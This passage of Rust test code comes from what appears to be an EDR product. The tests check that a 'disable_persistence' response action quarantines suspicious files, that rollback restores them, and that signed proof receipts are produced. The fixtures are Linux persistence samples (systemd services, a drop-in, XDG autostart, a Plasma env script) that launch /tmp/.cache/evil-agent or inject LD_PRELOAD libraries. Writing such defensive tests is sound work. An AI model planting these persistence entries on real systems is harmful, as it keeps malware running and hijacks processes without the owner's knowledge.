            proof_payload["executionReceipt"]["receipt"]["metadata"]["endpointDecision"]
                ["receiptFamily"],
            "response_execution"
        );
        let transition_receipts = proof_payload["transitionReceipts"]
            .as_array()
            .unwrap_or_else(|| panic!("missing cron drop-in proof transition receipts"));
        assert_eq!(transition_receipts.len(), 1);
        assert_eq!(
            transition_receipts[0]["receipt"]["metadata"]["endpointDecision"]["decision"]["title"],
            "Endpoint response action rolled back"
        );
        let rollback_receipts = proof_payload["rollbackReceipts"]
            .as_array()
            .unwrap_or_else(|| panic!("missing cron drop-in proof rollback receipts"));
        assert_eq!(rollback_receipts.len(), 1);
        assert_eq!(
            rollback_receipts[0]["receipt"]["metadata"]["endpointDecision"]["receiptFamily"],
            "response_rollback"
        );
        assert!(proof_payload["acknowledgementReceipts"]
            .as_array()
            .unwrap_or_else(|| panic!("missing cron drop-in proof acknowledgement receipts"))
            .is_empty());

        let _ = std::fs::remove_file(source_path);
        let _ = std::fs::remove_dir_all(cron_dir);
        let _ = std::fs::remove_dir_all(quarantine_root.as_ref());
        let _ = std::fs::remove_file(&receipt_path);
        let _ = std::fs::remove_file(endpoint_receipt_index_path(&receipt_path));
    }

    #[tokio::test]
    async fn agent_edr_response_action_disables_systemd_user_service_with_rollback_and_proof() {
        let receipt_path = test_receipt_path();
        let keypair = Keypair::from_seed(&[94u8; 32]);
        let signer_public_key = keypair.public_key().to_hex();
        let mut state_value = test_state();
        state_value.edr_receipt_ledger = Arc::new(Mutex::new(EndpointReceiptLedger {
            path: Some(receipt_path.clone()),
            next_sequence: 1,
            keypair,
            signer_identity: "test-edr-systemd-user-service-signer".to_string(),
            signer_public_key,
        }));
        let state = Arc::new(state_value);
        let quarantine_root = state.edr_quarantine_root.clone();
        let app = Router::new()
            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
            .route(
                "/api/v1/agent/edr/response-action",
                post(agent_edr_response_action),
            )
            .route(
                "/api/v1/agent/edr/response-executions/{execution_id}/rollback",
                post(agent_edr_response_execution_rollback),
            )
            .route(
                "/api/v1/agent/edr/response-executions/{execution_id}/proof",
                get(agent_edr_response_execution_proof),
            )
            .with_state(state.clone());
        let counter = TEST_POLICY_COUNTER.fetch_add(1, Ordering::Relaxed);
        let systemd_user_dir = std::env::temp_dir().join(format!(
            "clawdstrike-systemd-user-persistence-{}-{counter}/home/alice/.config/systemd/user",
            std::process::id()
        ));
        std::fs::create_dir_all(&systemd_user_dir)
            .unwrap_or_else(|e| panic!("failed to create systemd user persistence dir: {e}"));
        let source_path = systemd_user_dir.join("evil-agent.service");
        std::fs::write(
            &source_path,
            b"[Service]\nExecStart=/tmp/.cache/evil-agent\n[Install]\nWantedBy=default.target\n",
        )
        .unwrap_or_else(|e| panic!("failed to write systemd user service: {e}"));
        let observation = EndpointObservation {
            process: EndpointProcess {
                process_guid: Some("proc-disable-systemd-user-persistence-1".to_string()),
                image: Some("/usr/bin/systemctl".to_string()),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::FileAccess {
                operation: FileOperation::Write,
                path: source_path.display().to_string(),
                source_url: None,
                content_preview: None,
            },
            ..EndpointObservation::default()
        };
        let body = serde_json::json!({
            "observations": [observation],
            "honey_artifacts": []
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/findings")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| {
                panic!("failed to build systemd persistence findings request: {e}")
            });
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("systemd persistence findings request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);

        let file_node_id = {
            let recorder = state.edr_flight_recorder.lock().await;
            recorder
                .graph()
                .nodes
                .values()
                .find(|node| {
                    node.kind == CausalNodeKind::File
                        && node.label == source_path.display().to_string()
                })
                .map(|node| node.node_id.clone())
                .unwrap_or_else(|| panic!("missing systemd user service file graph node"))
        };
        let body = serde_json::json!({
            "action": "disable_persistence",
            "rootNodeId": file_node_id,
            "ttlSeconds": 600,
            "reason": "disable suspicious systemd user service",
            "actor": response_action_actor_input(),
            "dryRun": false
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/response-action")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| {
                panic!("failed to build systemd persistence response request: {e}")
            });
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("systemd persistence response request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read systemd persistence response: {e}"));
        let payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode systemd persistence response: {e}"));

        assert_eq!(payload["execution"]["action"], "disable_persistence");
        assert_eq!(payload["execution"]["status"], "succeeded");
        assert_eq!(
            payload["execution"]["effects"][0]["target"],
            source_path.display().to_string()
        );
        assert!(!source_path.exists());
        let disabled_path = PathBuf::from(
            payload["execution"]["effects"][0]["artifact"]
                .as_str()
                .unwrap_or_else(|| panic!("missing systemd persistence artifact path")),
        );
        assert!(disabled_path.is_file());
        assert_eq!(
            std::fs::read(&disabled_path)
                .unwrap_or_else(|e| panic!("failed to read systemd persistence artifact: {e}")),
            b"[Service]\nExecStart=/tmp/.cache/evil-agent\n[Install]\nWantedBy=default.target\n"
        );

        let execution_id = payload["execution"]["executionId"]
            .as_str()
            .unwrap_or_else(|| panic!("missing systemd persistence execution id"));
        let body = serde_json::json!({
            "reason": "restore systemd user service"
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri(format!(
                "/api/v1/agent/edr/response-executions/{execution_id}/rollback"
            ))
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| {
                panic!("failed to build systemd persistence rollback request: {e}")
            });
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("systemd persistence rollback request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        assert!(source_path.is_file());
        assert!(!disabled_path.exists());
        assert_response_rollback_proof(
            app,
            execution_id,
            &payload,
            &source_path,
            "systemd user service",
        )
        .await;

        let _ = std::fs::remove_file(source_path);
        let _ = std::fs::remove_dir_all(systemd_user_dir);
        let _ = std::fs::remove_dir_all(quarantine_root.as_ref());
        let _ = std::fs::remove_file(&receipt_path);
        let _ = std::fs::remove_file(endpoint_receipt_index_path(&receipt_path));
    }

    #[tokio::test]
    async fn agent_edr_response_action_disables_systemd_system_service_with_rollback_and_proof() {
        let receipt_path = test_receipt_path();
        let keypair = Keypair::from_seed(&[95u8; 32]);
        let signer_public_key = keypair.public_key().to_hex();
        let mut state_value = test_state();
        state_value.edr_receipt_ledger = Arc::new(Mutex::new(EndpointReceiptLedger {
            path: Some(receipt_path.clone()),
            next_sequence: 1,
            keypair,
            signer_identity: "test-edr-systemd-system-service-signer".to_string(),
            signer_public_key,
        }));
        let state = Arc::new(state_value);
        let quarantine_root = state.edr_quarantine_root.clone();
        let app = Router::new()
            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
            .route(
                "/api/v1/agent/edr/response-action",
                post(agent_edr_response_action),
            )
            .route(
                "/api/v1/agent/edr/response-executions/{execution_id}/rollback",
                post(agent_edr_response_execution_rollback),
            )
            .route(
                "/api/v1/agent/edr/response-executions/{execution_id}/proof",
                get(agent_edr_response_execution_proof),
            )
            .with_state(state.clone());
        let counter = TEST_POLICY_COUNTER.fetch_add(1, Ordering::Relaxed);
        let systemd_system_dir = std::env::temp_dir().join(format!(
            "clawdstrike-systemd-system-persistence-{}-{counter}/etc/systemd/system",
            std::process::id()
        ));
        std::fs::create_dir_all(&systemd_system_dir)
            .unwrap_or_else(|e| panic!("failed to create systemd system persistence dir: {e}"));
        let source_path = systemd_system_dir.join("evil-agent.service");
        std::fs::write(
            &source_path,
            b"[Service]\nExecStart=/tmp/.cache/evil-agent\n[Install]\nWantedBy=multi-user.target\n",
        )
        .unwrap_or_else(|e| panic!("failed to write systemd system service: {e}"));
        let observation = EndpointObservation {
            process: EndpointProcess {
                process_guid: Some("proc-disable-systemd-system-persistence-1".to_string()),
                image: Some("/usr/bin/systemctl".to_string()),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::FileAccess {
                operation: FileOperation::Write,
                path: source_path.display().to_string(),
                source_url: None,
                content_preview: None,
            },
            ..EndpointObservation::default()
        };
        let body = serde_json::json!({
            "observations": [observation],
            "honey_artifacts": []
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/findings")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| {
                panic!("failed to build systemd system persistence findings request: {e}")
            });
        let response =
            app.clone().oneshot(req).await.unwrap_or_else(|e| {
                panic!("systemd system persistence findings request failed: {e}")
            });
        assert_eq!(response.status(), StatusCode::OK);

        let file_node_id = {
            let recorder = state.edr_flight_recorder.lock().await;
            recorder
                .graph()
                .nodes
                .values()
                .find(|node| {
                    node.kind == CausalNodeKind::File
                        && node.label == source_path.display().to_string()
                })
                .map(|node| node.node_id.clone())
                .unwrap_or_else(|| panic!("missing systemd system service file graph node"))
        };
        let body = serde_json::json!({
            "action": "disable_persistence",
            "rootNodeId": file_node_id,
            "ttlSeconds": 600,
            "reason": "disable suspicious systemd system service",
            "actor": response_action_actor_input(),
            "dryRun": false
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/response-action")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| {
                panic!("failed to build systemd system persistence response request: {e}")
            });
        let response =
            app.clone().oneshot(req).await.unwrap_or_else(|e| {
                panic!("systemd system persistence response request failed: {e}")
            });
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read systemd system persistence response: {e}"));
        let payload: serde_json::Value = serde_json::from_slice(&bytes).unwrap_or_else(|e| {
            panic!("failed to decode systemd system persistence response: {e}")
        });

        assert_eq!(payload["execution"]["action"], "disable_persistence");
        assert_eq!(payload["execution"]["status"], "succeeded");
        assert_eq!(
            payload["execution"]["effects"][0]["target"],
            source_path.display().to_string()
        );
        assert!(!source_path.exists());
        let disabled_path = PathBuf::from(
            payload["execution"]["effects"][0]["artifact"]
                .as_str()
                .unwrap_or_else(|| panic!("missing systemd system persistence artifact path")),
        );
        assert!(disabled_path.is_file());
        assert_eq!(
            std::fs::read(&disabled_path)
                .unwrap_or_else(|e| panic!("failed to read systemd system artifact: {e}")),
            b"[Service]\nExecStart=/tmp/.cache/evil-agent\n[Install]\nWantedBy=multi-user.target\n"
        );

        let execution_id = payload["execution"]["executionId"]
            .as_str()
            .unwrap_or_else(|| panic!("missing systemd system persistence execution id"));
        let body = serde_json::json!({
            "reason": "restore systemd system service"
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri(format!(
                "/api/v1/agent/edr/response-executions/{execution_id}/rollback"
            ))
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| {
                panic!("failed to build systemd system persistence rollback request: {e}")
            });
        let response =
            app.clone().oneshot(req).await.unwrap_or_else(|e| {
                panic!("systemd system persistence rollback request failed: {e}")
            });
        assert_eq!(response.status(), StatusCode::OK);
        assert!(source_path.is_file());
        assert!(!disabled_path.exists());
        assert_response_rollback_proof(
            app,
            execution_id,
            &payload,
            &source_path,
            "systemd system service",
        )
        .await;

        let _ = std::fs::remove_file(source_path);
        let _ = std::fs::remove_dir_all(systemd_system_dir);
        let _ = std::fs::remove_dir_all(quarantine_root.as_ref());
        let _ = std::fs::remove_file(&receipt_path);
        let _ = std::fs::remove_file(endpoint_receipt_index_path(&receipt_path));
    }

    #[tokio::test]
    async fn agent_edr_response_action_disables_systemd_system_dropin_with_rollback_and_proof() {
        let receipt_path = test_receipt_path();
        let keypair = Keypair::from_seed(&[96u8; 32]);
        let signer_public_key = keypair.public_key().to_hex();
        let mut state_value = test_state();
        state_value.edr_receipt_ledger = Arc::new(Mutex::new(EndpointReceiptLedger {
            path: Some(receipt_path.clone()),
            next_sequence: 1,
            keypair,
            signer_identity: "test-edr-systemd-system-dropin-signer".to_string(),
            signer_public_key,
        }));
        let state = Arc::new(state_value);
        let quarantine_root = state.edr_quarantine_root.clone();
        let app = Router::new()
            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
            .route(
                "/api/v1/agent/edr/response-action",
                post(agent_edr_response_action),
            )
            .route(
                "/api/v1/agent/edr/response-executions/{execution_id}/rollback",
                post(agent_edr_response_execution_rollback),
            )
            .route(
                "/api/v1/agent/edr/response-executions/{execution_id}/proof",
                get(agent_edr_response_execution_proof),
            )
            .with_state(state.clone());
        let counter = TEST_POLICY_COUNTER.fetch_add(1, Ordering::Relaxed);
        let systemd_dropin_dir = std::env::temp_dir().join(format!(
            "clawdstrike-systemd-dropin-persistence-{}-{counter}/etc/systemd/system/evil-agent.service.d",
            std::process::id()
        ));
        std::fs::create_dir_all(&systemd_dropin_dir)
            .unwrap_or_else(|e| panic!("failed to create systemd drop-in dir: {e}"));
        let source_path = systemd_dropin_dir.join("override.conf");
        std::fs::write(
            &source_path,
            b"[Service]\nEnvironment=LD_PRELOAD=/tmp/.cache/libevil.so\n",
        )
        .unwrap_or_else(|e| panic!("failed to write systemd drop-in: {e}"));
        let observation = EndpointObservation {
            process: EndpointProcess {
                process_guid: Some("proc-disable-systemd-system-dropin-1".to_string()),
                image: Some("/usr/bin/systemctl".to_string()),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::FileAccess {
                operation: FileOperation::Write,
                path: source_path.display().to_string(),
                source_url: None,
                content_preview: None,
            },
            ..EndpointObservation::default()
        };
        let body = serde_json::json!({
            "observations": [observation],
            "honey_artifacts": []
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/findings")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| {
                panic!("failed to build systemd drop-in persistence findings request: {e}")
            });
        let response =
            app.clone().oneshot(req).await.unwrap_or_else(|e| {
                panic!("systemd drop-in persistence findings request failed: {e}")
            });
        assert_eq!(response.status(), StatusCode::OK);

        let file_node_id = {
            let recorder = state.edr_flight_recorder.lock().await;
            recorder
                .graph()
                .nodes
                .values()
                .find(|node| {
                    node.kind == CausalNodeKind::File
                        && node.label == source_path.display().to_string()
                })
                .map(|node| node.node_id.clone())
                .unwrap_or_else(|| panic!("missing systemd drop-in file graph node"))
        };
        let body = serde_json::json!({
            "action": "disable_persistence",
            "rootNodeId": file_node_id,
            "ttlSeconds": 600,
            "reason": "disable suspicious systemd drop-in",
            "actor": response_action_actor_input(),
            "dryRun": false
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/response-action")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| {
                panic!("failed to build systemd drop-in persistence response request: {e}")
            });
        let response =
            app.clone().oneshot(req).await.unwrap_or_else(|e| {
                panic!("systemd drop-in persistence response request failed: {e}")
            });
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read systemd drop-in persistence response: {e}"));
        let payload: serde_json::Value = serde_json::from_slice(&bytes).unwrap_or_else(|e| {
            panic!("failed to decode systemd drop-in persistence response: {e}")
        });

        assert_eq!(payload["execution"]["action"], "disable_persistence");
        assert_eq!(payload["execution"]["status"], "succeeded");
        assert_eq!(
            payload["execution"]["effects"][0]["target"],
            source_path.display().to_string()
        );
        assert!(!source_path.exists());
        let disabled_path = PathBuf::from(
            payload["execution"]["effects"][0]["artifact"]
                .as_str()
                .unwrap_or_else(|| panic!("missing systemd drop-in persistence artifact path")),
        );
        assert!(disabled_path.is_file());
        assert_eq!(
            std::fs::read(&disabled_path)
                .unwrap_or_else(|e| panic!("failed to read systemd drop-in artifact: {e}")),
            b"[Service]\nEnvironment=LD_PRELOAD=/tmp/.cache/libevil.so\n"
        );

        let execution_id = payload["execution"]["executionId"]
            .as_str()
            .unwrap_or_else(|| panic!("missing systemd drop-in persistence execution id"));
        let body = serde_json::json!({
            "reason": "restore systemd drop-in"
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri(format!(
                "/api/v1/agent/edr/response-executions/{execution_id}/rollback"
            ))
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| {
                panic!("failed to build systemd drop-in persistence rollback request: {e}")
            });
        let response =
            app.clone().oneshot(req).await.unwrap_or_else(|e| {
                panic!("systemd drop-in persistence rollback request failed: {e}")
            });
        assert_eq!(response.status(), StatusCode::OK);
        assert!(source_path.is_file());
        assert!(!disabled_path.exists());
        assert_response_rollback_proof(
            app,
            execution_id,
            &payload,
            &source_path,
            "systemd system drop-in",
        )
        .await;

        let _ = std::fs::remove_file(source_path);
        let _ = std::fs::remove_dir_all(systemd_dropin_dir);
        let _ = std::fs::remove_dir_all(quarantine_root.as_ref());
        let _ = std::fs::remove_file(&receipt_path);
        let _ = std::fs::remove_file(endpoint_receipt_index_path(&receipt_path));
    }

    #[tokio::test]
    async fn agent_edr_response_action_disables_xdg_autostart_with_rollback_and_proof() {
        let receipt_path = test_receipt_path();
        let keypair = Keypair::from_seed(&[97u8; 32]);
        let signer_public_key = keypair.public_key().to_hex();
        let mut state_value = test_state();
        state_value.edr_receipt_ledger = Arc::new(Mutex::new(EndpointReceiptLedger {
            path: Some(receipt_path.clone()),
            next_sequence: 1,
            keypair,
            signer_identity: "test-edr-xdg-autostart-signer".to_string(),
            signer_public_key,
        }));
        let state = Arc::new(state_value);
        let quarantine_root = state.edr_quarantine_root.clone();
        let app = Router::new()
            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
            .route(
                "/api/v1/agent/edr/response-action",
                post(agent_edr_response_action),
            )
            .route(
                "/api/v1/agent/edr/response-executions/{execution_id}/rollback",
                post(agent_edr_response_execution_rollback),
            )
            .route(
                "/api/v1/agent/edr/response-executions/{execution_id}/proof",
                get(agent_edr_response_execution_proof),
            )
            .with_state(state.clone());
        let counter = TEST_POLICY_COUNTER.fetch_add(1, Ordering::Relaxed);
        let autostart_dir = std::env::temp_dir().join(format!(
            "clawdstrike-xdg-autostart-persistence-{}-{counter}/home/alice/.config/autostart",
            std::process::id()
        ));
        std::fs::create_dir_all(&autostart_dir)
            .unwrap_or_else(|e| panic!("failed to create XDG autostart dir: {e}"));
        let source_path = autostart_dir.join("evil-agent.desktop");
        std::fs::write(
            &source_path,
            b"[Desktop Entry]\nType=Application\nName=Updater\nExec=/tmp/.cache/evil-agent\n",
        )
        .unwrap_or_else(|e| panic!("failed to write XDG autostart file: {e}"));
        let observation = EndpointObservation {
            process: EndpointProcess {
                process_guid: Some("proc-disable-xdg-autostart-1".to_string()),
                image: Some("/usr/bin/xdg-desktop-menu".to_string()),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::FileAccess {
                operation: FileOperation::Write,
                path: source_path.display().to_string(),
                source_url: None,
                content_preview: None,
            },
            ..EndpointObservation::default()
        };
        let body = serde_json::json!({
            "observations": [observation],
            "honey_artifacts": []
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/findings")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build XDG autostart findings request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("XDG autostart findings request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);

        let file_node_id = {
            let recorder = state.edr_flight_recorder.lock().await;
            recorder
                .graph()
                .nodes
                .values()
                .find(|node| {
                    node.kind == CausalNodeKind::File
                        && node.label == source_path.display().to_string()
                })
                .map(|node| node.node_id.clone())
                .unwrap_or_else(|| panic!("missing XDG autostart file graph node"))
        };
        let body = serde_json::json!({
            "action": "disable_persistence",
            "rootNodeId": file_node_id,
            "ttlSeconds": 600,
            "reason": "disable suspicious XDG autostart entry",
            "actor": response_action_actor_input(),
            "dryRun": false
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/response-action")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build XDG autostart response request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("XDG autostart response request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read XDG autostart response: {e}"));
        let payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode XDG autostart response: {e}"));

        assert_eq!(payload["execution"]["action"], "disable_persistence");
        assert_eq!(payload["execution"]["status"], "succeeded");
        assert_eq!(
            payload["execution"]["effects"][0]["target"],
            source_path.display().to_string()
        );
        assert!(!source_path.exists());
        let disabled_path = PathBuf::from(
            payload["execution"]["effects"][0]["artifact"]
                .as_str()
                .unwrap_or_else(|| panic!("missing XDG autostart artifact path")),
        );
        assert!(disabled_path.is_file());
        assert_eq!(
            std::fs::read(&disabled_path)
                .unwrap_or_else(|e| panic!("failed to read XDG autostart artifact: {e}")),
            b"[Desktop Entry]\nType=Application\nName=Updater\nExec=/tmp/.cache/evil-agent\n"
        );

        let execution_id = payload["execution"]["executionId"]
            .as_str()
            .unwrap_or_else(|| panic!("missing XDG autostart execution id"));
        let body = serde_json::json!({
            "reason": "restore XDG autostart entry"
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri(format!(
                "/api/v1/agent/edr/response-executions/{execution_id}/rollback"
            ))
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build XDG autostart rollback request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("XDG autostart rollback request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        assert!(source_path.is_file());
        assert!(!disabled_path.exists());
        assert_response_rollback_proof(app, execution_id, &payload, &source_path, "XDG autostart")
            .await;

        let _ = std::fs::remove_file(source_path);
        let _ = std::fs::remove_dir_all(autostart_dir);
        let _ = std::fs::remove_dir_all(quarantine_root.as_ref());
        let _ = std::fs::remove_file(&receipt_path);
        let _ = std::fs::remove_file(endpoint_receipt_index_path(&receipt_path));
    }

    #[tokio::test]
    async fn agent_edr_response_action_disables_plasma_env_script_with_rollback_and_proof() {
        let receipt_path = test_receipt_path();
        let keypair = Keypair::from_seed(&[98u8; 32]);
        let signer_public_key = keypair.public_key().to_hex();
        let mut state_value = test_state();
        state_value.edr_receipt_ledger = Arc::new(Mutex::new(EndpointReceiptLedger {
            path: Some(receipt_path.clone()),
            next_sequence: 1,
            keypair,
            signer_identity: "test-edr-plasma-env-script-signer".to_string(),
            signer_public_key,
        }));
        let state = Arc::new(state_value);
        let quarantine_root = state.edr_quarantine_root.clone();
        let app = Router::new()
            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
            .route(
                "/api/v1/agent/edr/response-action",
                post(agent_edr_response_action),
            )
            .route(
                "/api/v1/agent/edr/response-executions/{execution_id}/rollback",
                post(agent_edr_response_execution_rollback),
            )
            .route(
                "/api/v1/agent/edr/response-executions/{execution_id}/proof",
                get(agent_edr_response_execution_proof),
            )
            .with_state(state.clone());
        let counter = TEST_POLICY_COUNTER.fetch_add(1, Ordering::Relaxed);
        let plasma_env_dir = std::env::temp_dir().join(format!(
            "clawdstrike-plasma-env-persistence-{}-{counter}/home/alice/.config/plasma-workspace/env",
            std::process::id()
        ));
        std::fs::create_dir_all(&plasma_env_dir)
            .unwrap_or_else(|e| panic!("failed to create Plasma env dir: {e}"));
        let source_path = plasma_env_dir.join("evil-agent.sh");
        std::fs::write(
            &source_path,
            b"#!/bin/sh\nexport LD_PRELOAD=/tmp/.cache/libevil.so\n",
        )
        .unwrap_or_else(|e| panic!("failed to write Plasma env script: {e}"));
        let observation = EndpointObservation {
            process: EndpointProcess {
                process_guid: Some("proc-disable-plasma-env-1".to_string()),
                image: Some("/usr/bin/kwriteconfig5".to_string()),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::FileAccess {
                operation: FileOperation::Write,
                path: source_path.display().to_string(),
                source_url: None,
                content_preview: None,
            },
            ..EndpointObservation::default()
        };
        let body = serde_json::json!({
            "observations": [observation],
            "honey_artifacts": []
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/findings")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build Plasma env findings request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("Plasma env findings request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);

        let file_node_id = {
            let recorder = state.edr_flight_recorder.lock().await;
            recorder
                .graph()
                .nodes
                .values()
                .find(|node| {
                    node.kind == CausalNodeKind::File
                        && node.label == source_path.display().to_string()
                })
                .map(|node| node.node_id.clone())
                .unwrap_or_else(|| panic!("missing Plasma env file graph node"))
        };
        let body = serde_json::json!({
            "action": "disable_persistence",
            "rootNodeId": file_node_id,
            "ttlSeconds": 600,
            "reason": "disable suspicious Plasma env script",
            "actor": response_action_actor_input(),
            "dryRun": false
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/response-action")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build Plasma env response request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("Plasma env response request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read Plasma env response: {e}"));
        let payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode Plasma env response: {e}"));

        assert_eq!(payload["execution"]["action"], "disable_persistence");
        assert_eq!(payload["execution"]["status"], "succeeded");
        assert_eq!(
            payload["execution"]["effects"][0]["target"],
            source_path.display().to_string()
        );
        assert!(!source_path.exists());
        let disabled_path = PathBuf::from(
            payload["execution"]["effects"][0]["artifact"]
                .as_str()
                .unwrap_or_else(|| panic!("missing Plasma env artifact path")),
        );
        assert!(disabled_path.is_file());
        assert_eq!(
            std::fs::read(&disabled_path)
                .unwrap_or_else(|e| panic!("failed to read Plasma env artifact: {e}")),
            b"#!/bin/sh\nexport LD_PRELOAD=/tmp/.cache/libevil.so\n"
        );

        let execution_id = payload["execution"]["executionId"]
            .as_str()
            .unwrap_or_else(|| panic!("missing Plasma env execution id"));
        let body = serde_json::json!({
            "reason": "restore Plasma env script"
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri(format!(
                "/api/v1/agent/edr/response-executions/{execution_id}/rollback"
            ))
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build Plasma env rollback request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("Plasma env rollback request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        assert!(source_path.is_file());
        assert!(!disabled_path.exists());
        assert_response_rollback_proof(
            app,
            execution_id,
            &payload,
            &source_path,
            "Plasma env script",
        )
        .await;

        let _ = std::fs::remove_file(source_path);
        let _ = std::fs::remove_dir_all(plasma_env_dir);
        let _ = std::fs::remove_dir_all(quarantine_root.as_ref());
        let _ = std::fs::remove_file(&receipt_path);
        let _ = std::fs::remove_file(endpoint_receipt_index_path(&receipt_path));
    }

    #[tokio::test]
    async fn agent_edr_response_action_disables_kde_autostart_script_with_rollback_and_proof() {
        let receipt_path = test_receipt_path();
        let keypair = Keypair::from_seed(&[99u8; 32]);
        let signer_public_key = keypair.public_key().to_hex();
        let mut state_value = test_state();
        state_value.edr_receipt_ledger = Arc::new(Mutex::new(EndpointReceiptLedger {
            path: Some(receipt_path.clone()),
            next_sequence: 1,
            keypair,
            signer_identity: "test-edr-kde-autostart-script-signer".to_string(),
            signer_public_key,
        }));
        let state = Arc::new(state_value);
        let quarantine_root = state.edr_quarantine_root.clone();
        let app = Router::new()
            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
            .route(
                "/api/v1/agent/edr/response-action",
                post(agent_edr_response_action),
